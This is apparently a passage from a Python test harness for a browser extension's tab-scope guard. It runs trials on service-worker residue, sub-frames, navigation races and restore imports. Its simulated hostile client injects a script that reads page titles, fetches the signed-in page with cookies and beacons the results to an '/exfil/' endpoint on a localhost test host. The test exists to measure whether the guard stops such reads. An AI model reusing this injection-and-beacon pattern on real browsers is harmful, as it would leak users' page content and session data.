        "exfil_title_ms": pct([x["exfil_title_ms"] for x in rows]),
        "client_read_screencast": sum(x["frame_read"] for x in rows),
        "client_read_screenshot": sum(x["shot_read"] for x in rows),
        "client_read_any": sum(1 for x in rows if x["poll_read"] or x["ev_read"] or x["init_read"] or x["body_read"] or x["late_body_title"]
                               or x["title_read"] or x["frame_read"] or x["shot_read"] or x["exfil_title"] in WORKER_TITLES),
        "title_ms": pct([x["title_ms"] for x in rows]),
        "frame_ms": pct([x["frame_ms"] for x in rows]),
        "shot_ms": pct([x["shot_ms"] for x in rows]),
        "init_ms": pct([x["init_ms"] for x in rows]),
        "commit_ms": pct([x["commit_ms"] for x in rows]),
        "beacon_ms": pct([x["beacon_ms"] for x in rows]),
        "notice_ms": pct([x["notice_ms"] for x in rows]),
        "blank_ms": pct([x["blank_ms"] for x in rows]),
        "commit_to_blank_ms": pct([x["blank_ms"] - x["commit_ms"] for x in rows if x["blank_ms"] is not None and x["commit_ms"] is not None]),
        "poll_first_read_ms": pct([x["poll_first_ms"] for x in rows]),
        "titles_read": sorted({x["poll_title"] for x in rows if x["poll_title"]} | {r["title"] for x in rows for r in x["ev_reads"] if r["title"]}
                              | {x["init_title"] for x in rows if x["init_title"]} | {x["body_title"] for x in rows if x["body_title"]}
                              | {x["late_body_title"] for x in rows if x["late_body_title"]} | {x["title_value"] for x in rows if x["title_value"]}),
    }
    with open(os.path.join(RUN, f"rows-{label}.json"), "w") as f:
        json.dump(rows, f, indent=1)
    return agg


def run_cases():
    r = D.set_scopes(scopes_obj())
    check("set_scopes answers ok (operator \"*\")", r.get("ok"), data=r.get("data"))

    # ---- two marked tabs with "*" register the workers of two hosts of no list and stay there ----
    ev = operator_tab("ctrl+t")
    op1 = ((ev or {}).get("tab") or {}).get("id")
    check("the operator's Ctrl+T tab is a marked tab", op1 is not None and is_marked(op1), tab=op1)
    check(f"the marked tab registers the own-page worker of {FREE} (a host on no list)", register(FREE, "own"))
    operator_goes(url(FREE, "/sw-own/marked-self"))
    ran = wait_for(lambda: reqs(FREE, "/beacon/swpage/sw-own/marked-self"), 5)
    check("in the marked tab the worker's own page loads with no network request", bool(ran) and not reqs(FREE, "/sw-own/marked-self"))
    ev = operator_tab("ctrl+t")
    op2 = ((ev or {}).get("tab") or {}).get("id")
    check("a second Ctrl+T tab is a marked tab", op2 is not None and is_marked(op2), tab=op2)
    ok2 = register(FREE_C, "cache")
    signed_cached = any(x["signed"] for x in reqs(FREE_C, "/signed-in"))
    check(f"the second marked tab signs in to {FREE_C} (a made-up cookie), caches the signed-in page and registers the cache worker", ok2 and signed_cached)
    operator_goes(url(FREE_C, "/cache/marked-self"))
    ran = wait_for(lambda: reqs(FREE_C, "/beacon/swpage/cache/marked-self"), 5)
    check("in the marked tab the cache worker answers with the cached signed-in page, no network request",
          bool(ran) and not reqs(FREE_C, "/cache/marked-self"))
    shot("marked-tabs")

    # ---- a tab of scope-a ----
    a = agent_tab("scope-a", "sitea.localhost", "/a1")
    check("a tab of scope-a loads its own list's site", loaded("sitea.localhost", "/a1"), tab=a)
    init = ("document.addEventListener('DOMContentLoaded', () => { try { __awRead(location.href + '\\n' + document.title); } catch (e) {} });")
    # The client's own script in each new document sends what it reads to the client's own site
    # (sitea, on the scope's list) with sendBeacon: the page's title, and the title of a
    # same-origin fetch of /signed-in (with the page's cookies). Only on the test hosts of no list
    # and on sitea's /magenta self-test page, so that the log stays small.
    exfil = ("(() => { if (!/nolist/.test(location.hostname) && location.pathname !== '/magenta') return;"
             " const send = (w, v) => navigator.sendBeacon('" + url("sitea.localhost", "/exfil/") + "' + w + location.pathname, String(v));"
             " document.addEventListener('DOMContentLoaded', () => { send('title', document.title);"
             " fetch('/signed-in', {credentials: 'same-origin'}).then((r) => r.text()).then((t) => send('fetch', (t.match(/<title>(.*?)<\\/title>/) || [])[1]))"
             ".catch(() => {}); }); })();")
    if not READERS:
        check("the client of scope-a's tab enables Page only (READERS=0: no reader, the guard's times alone)", cdp(a, "Page.enable").get("ok"))
    setup = [] if not READERS else [cdp(a, "Page.enable").get("ok"), cdp(a, "Runtime.enable").get("ok"), cdp(a, "Network.enable").get("ok"),
             cdp(a, "Runtime.addBinding", {"name": "__awRead"}).get("ok"), cdp(a, "Page.addScriptToEvaluateOnNewDocument", {"source": init}).get("ok"),
             cdp(a, "Page.addScriptToEvaluateOnNewDocument", {"source": exfil}).get("ok"),
             cdp(a, "Page.startScreencast", {"format": "jpeg", "quality": 40, "maxWidth": 640, "maxHeight": 450, "everyNthFrame": 1}).get("ok")]
    if READERS:
        check("the client of scope-a's tab enables Page, Runtime and Network, adds a binding and two init scripts, starts a screencast (it reads every page it can)", all(setup), setup=setup)

    # The readers themselves: on a page of the tab's own list (it stays), each reader reads it.
    if READERS:
        self_test(a)
    run_trials(a, op1, op2)


def self_test(a):
    rd = Reader(a, "sitea.localhost")
    rd.label = "selftest"
    rd.t0 = now_ms()
    D.on_event = rd.hook
    th = threading.Thread(target=rd.poll_loop, daemon=True)
    ts = threading.Thread(target=rd.shot_loop, daemon=True)
    D.call_nowait("bridge", "debugger.sendCommand", args=[{"tabId": a}, "Page.navigate", {"url": url("sitea.localhost", "/magenta")}])
    th.start()
    ts.start()
    loaded("sitea.localhost", "/magenta")
    time.sleep(0.6)
    rd.stop = True
    th.join(3)
    ts.join(3)
    D.on_event = None
    rd.after()
    sm = rd.summary()
    check("the readers read a page that stays (sitea, the tab's own list): poll, context event, init script (binding and beacon), response body, title event, screencast",
          sm["poll_read"] and sm["ev_read"] and sm["init_read"] and sm["body_read"] and sm["late_body_title"] is not None
          and sm["frame_read"] and any(t == "sitea magenta" for at, t in rd.titles)
          and [x["title"] for x in posts("/exfil/title/magenta")] == ["sitea magenta"] and [x["title"] for x in posts("/exfil/fetch/magenta")] == ["signed out"],
          titles=sorted({t for at, t in rd.titles}), exfil=[x["title"] for x in posts("/exfil/title/magenta") + posts("/exfil/fetch/magenta")],
          **{k: sm[k] for k in ("poll_read", "poll_first_ms", "ev_read", "init_read", "init_ms", "body_read", "late_body_title", "commit_ms", "ctx_ms",
                                "title_read", "title_ms", "frame_read", "frame_ms", "shot_read", "shot_ms")})


def phase(a, label, cases, out, after=False):
    """Trials of tab a against each (host, prefix, n, form). before: the worker's page may commit
    (the residue; at least one commit shows the worker is there). after: no commit, no script, no
    read."""
    for host, prefix, n, form in cases:
        if n <= 0:
            continue
        for kind, what in (("cdp", "a client's Page.navigate"), ("same", "a page script's link click")):
            rows = trials(a, host, kind, f"{label}-{prefix}", n)
            agg = report(f"{label}-{form}-{kind}", rows)
            out[f"{label}-{form}-{kind}"] = agg
            ok = agg["blank_with_one_right_notice"] == n
            if after:
                ok = ok and agg["commit_seen_by_client"] == 0 and agg["script_ran_beacon"] == 0 and agg["client_read_any"] == 0 and agg["network_request"] == 0
            elif form != "control":
                ok = ok and agg["commit_seen_by_client"] >= 1
            check(f"{label}: {form} ({host}), {what}: {agg['blank_with_one_right_notice']} of {n} at about:blank with one blocked; "
                  f"commit seen {agg['commit_seen_by_client']}, script ran {agg['script_ran_beacon']}, client read {agg['client_read_any']}",
                  ok, **agg)


def race(a, op, reps):
    """The gap right after the leave: the marked tab registers the worker, leaves, and tab a's
    Page.navigate to the host starts wait ms after the server saw the leave's request."""
    rows = []
    for wait in (0, 100, 300):
        for i in range(reps):
            if not focus(op) or not register(FREE, "own"):
                rows.append({"wait": wait, "error": "no worker"})
                continue
            start_path = f"/race-start-{wait}-{i}"
            nav_cdp(a, url("sitea.localhost", start_path))
            loaded("sitea.localhost", start_path)
            time.sleep(0.2)
            path = f"/race/w{wait}-{i}"
            rd = Reader(a, FREE)
            mark = len(D.notices)
            t_leave = leave(op, f"/race-leave-{wait}-{i}")
            if t_leave is None:
                rows.append({"wait": wait, "error": "no leave"})
                continue
            while now_ms() < t_leave + wait:
                time.sleep(0.002)
            rd.t0 = now_ms()
            D.on_event = rd.hook
            D.call_nowait("bridge", "debugger.sendCommand", args=[{"tabId": a}, "Page.navigate", {"url": url(FREE, path)}])
            wait_for(lambda: notices_for(a, mark), 3)
            at_blank(a)
            time.sleep(0.4)
            D.on_event = None
            beacons = reqs(FREE, "/beacon/swpage" + path)
            sm = rd.summary()
            rows.append({"wait": wait, "start_after_leave_ms": round(rd.t0 - t_leave, 1), "commit": sm["commit_ms"] is not None,
                         "ran": bool(beacons), "notices": len(notices_for(a, mark))})
    with open(os.path.join(RUN, "rows-race.json"), "w") as f:
        json.dump(rows, f, indent=1)
    by = {w: [x for x in rows if x.get("wait") == w and "error" not in x] for w in (0, 100, 300)}
    summary = {f"wait_{w}": {"trials": len(xs), "commit": sum(x["commit"] for x in xs), "ran": sum(x["ran"] for x in xs)} for w, xs in by.items()}
    check(f"race: the worker's page right after the leave (commits of trials): " + ", ".join(f"{w} ms {v['commit']} of {v['trials']}" for w, v in
          ((w, summary[f"wait_{w}"]) for w in (0, 100, 300))), all("error" not in x for x in rows), **summary)


def run_trials(a, op1, op2):
    out = {}
    # ---- before: the marked tabs show the hosts (the residue as measured on board ab-v16.73) ----
    phase(a, "before", ((FREE, "sw-own", N, "own"), (FREE_C, "cache", NC, "cache"), (NOWORKER, "ctrl", NCTRL, "control")), out)

    # ---- the leave: both marked tabs open a page of a host with no worker ----
    t1 = leave(op1, "/leave-own")
    t2 = leave(op2, "/leave-cache")
    check("both marked tabs leave their hosts (the operator selects each and types a URL)", t1 is not None and t2 is not None)
    time.sleep(1.0)
    shot("after-leave")

    # ---- after: the workers are gone ----
    phase(a, "after", ((FREE, "sw-own", NA, "own"), (FREE_C, "cache", NA, "cache")), out, after=True)

    # ---- frame: the host in a sub-frame of a marked tab's page keeps its worker ----
    # Tab op1 registers the worker again (its top frame shows the host); tab op2 opens a page of
    # another host with a frame of the host; then op1 leaves: a frame of op2 still shows the host.
    if NF > 0:
        ok = focus(op1) and register(FREE, "own")
        framed = focus(op2)
        operator_goes(url(NOWORKER, "/embed?src=" + quote(url(FREE, "/framed"), safe="")))
        framed = framed and bool(wait_for(lambda: reqs(NOWORKER, "/beacon/embed") and reqs(FREE, "/framed"), 5))
        left = leave(op1, "/leave-frame-top") is not None
        check("frame: a marked tab registers the worker again; a second marked tab shows the host in a sub-frame of another host's page; the first leaves the host",
              ok and framed and left)
        time.sleep(1.0)
        phase(a, "frame-shown", ((FREE, "sw-own", NF, "own"),), out)
        check("frame: the page with the frame leaves", leave(op2, "/leave-frame") is not None)
        time.sleep(1.0)
        phase(a, "frame-left", ((FREE, "sw-own", NF, "own"),), out, after=True)

    # ---- race: the gap right after the leave ----
    if NRACE > 0:
        race(a, op1, NRACE)

    # ---- gone: the marked tab's next navigation to the host goes to the network ----
    focus(op1)
    operator_goes(url(FREE, "/sw-own/gone-check"))
    net = wait_for(lambda: reqs(FREE, "/sw-own/gone-check"), 5)
    check("gone: the marked tab's next navigation to the host is a network request (no worker answers it)", bool(net))
    with open(os.path.join(RUN, "summary.json"), "w") as f:
        json.dump(out, f, indent=1)

    # ---- C6: the restore tab of an import whose site redirects to the worker's host ----
    if NR <= 0:
        shot("end")
        return
    rows = []
    for i in range(NR):
        target = url(FREE, f"/sw-own/restore{i}")
        state = {"v": 1, "domain": "siter.localhost", "origin": origin(SITER), "url": url(SITER, "/redir?to=" + quote(target, safe="")),
                 "cookies": [], "storage": {"local": {}, "session": {}, "idb": [], "caches": []}}
        known = set(tab_ids())
        nmark = len(D.notices)
        t0 = now_ms()
        rid = D.call_nowait("main", "import", state=state)
        attaches = []
        restore = None
        while D.peek_res(rid, "main") is None and now_ms() - t0 < 30000:
            if restore is None:
                fresh = [t for t in tab_ids() if t not in known]
                restore = fresh[0] if fresh else None
            if restore is not None:
                s = now_ms()
                ra = D.bridge("debugger.attach", [restore])
                attaches.append((round(s - t0, 1), "ok" if ra.get("ok") else ra.get("error")))
                if ra.get("ok"):
                    D.bridge("debugger.detach", [restore])
            time.sleep(0.005)
        res = D.wait_res(rid, 30, "main")
        t_res = now_ms()
        time.sleep(0.5)
        got = notices_for(restore, nmark) if restore is not None else []
        b = reqs(FREE, f"/beacon/swpage/sw-own/restore{i}")
        rows.append({
            "import_ok": res.get("ok"), "import_error": res.get("error"), "restore_tab": restore,
            "redirect_hit": bool(reqs(SITER, "/redir")), "net": bool(reqs(FREE, f"/sw-own/restore{i}")),
            "ran": bool(b), "beacon_ms": round(b[0]["t"] - t0, 1) if b else None,
            "notices": got, "notice_ms": round(next(at for at, m in notices_since(nmark) if m.get("tab") == restore) - t0, 1) if got else None,
            "answer_ms": round(t_res - t0, 1),
            "attach_tries": len(attaches), "attach_ok": sum(1 for x in attaches if x[1] == "ok"),
            "attach_answers": sorted({x[1] for x in attaches}),
            "url_after": tab_url(restore) if restore is not None else None,
        })
        if restore is not None:
            D.bridge("tabs.remove", [restore])
        time.sleep(0.3)
    with open(os.path.join(RUN, "rows-restore.json"), "w") as f:
        json.dump(rows, f, indent=1)
    check(f"C6: {NR} imports whose page redirects to the worker's host: import ok {sum(1 for x in rows if x['import_ok'])}, "
          f"worker page ran {sum(x['ran'] for x in rows)}, notices {sum(len(x['notices']) for x in rows)}, client attach ok {sum(x['attach_ok'] for x in rows)}",
          True, rows=rows[:3], beacon_ms=pct([x["beacon_ms"] for x in rows]), notice_ms=pct([x["notice_ms"] for x in rows]),
          answer_ms=pct([x["answer_ms"] for x in rows]), attach_answers=sorted({a for x in rows for a in x["attach_answers"]}),
          ran=sum(x["ran"] for x in rows), net=sum(x["net"] for x in rows))
    shot("end")


def main():
    start()
    try:
        ok = D.wait_hello(1, 30)
        check("the receiver says hello", ok, hello=D.hellos[:1])
        D.bridge("bridge.info", [])
        if os.environ.get("EAGER") == "1":
            check("the eager attach is on (bridge.attachNew [true])", D.bridge("bridge.attachNew", [True]).get("ok"))
        run_cases()
    except Exception as e:  # the run's own failure
        import traceback
        traceback.print_exc()
        check("the run ended without an exception", False, error=f"{type(e).__name__}: {e}")
    finally:
        with open(os.path.join(RUN, "results.json"), "w") as f:
            json.dump(results, f, indent=1)
        with open(os.path.join(RUN, "logs", "notices.jsonl"), "w") as f:
            for at, m in D.notices:
                f.write(json.dumps({"at": round(at, 1), **m}) + "\n")
        stop()
    passed = sum(1 for r in results if r["pass"])
    print(f"{passed} of {len(results)} checks passed", flush=True)
    os._exit(0 if passed == len(results) else 1)


main()
